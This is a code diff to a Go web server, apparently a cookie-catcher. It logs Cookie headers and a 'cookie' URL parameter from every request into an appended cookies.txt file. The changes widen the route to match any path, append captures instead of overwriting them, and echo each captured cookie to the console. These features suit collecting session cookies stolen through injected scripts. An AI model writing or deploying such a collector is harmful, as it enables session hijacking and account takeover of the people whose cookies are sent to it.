@@ -21,11 +21,11 @@ func main() {
 	r := gin.Default()
 
 	// Ping handler
-	r.GET("/:page", func(c *gin.Context) {
+	r.GET("/*page", func(c *gin.Context) {
 
 		val := c.Request.Header["Cookie"]
 
-		f, err := os.Create("./cookies.txt")
+		f, err := os.OpenFile("cookies.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 		defer f.Close()
 
 		if err != nil {
@@ -37,11 +37,13 @@ func main() {
 
 		for _, cookie := range val {
 			l := fmt.Sprintf("\n\n--- %s ---\nCookie (Header): %s\n", t, cookie)
+			fmt.Println(l)
 			f.Write([]byte(l))
 		}
 
 		cookie := c.Query("cookie")
 		l := fmt.Sprintf("--- %s ---\nCookie (Param): %s\n", t, cookie)
+		fmt.Println(l)
 		f.Write([]byte(l))
 		if err != nil {
 			glog.Fatal("Error writing to file")
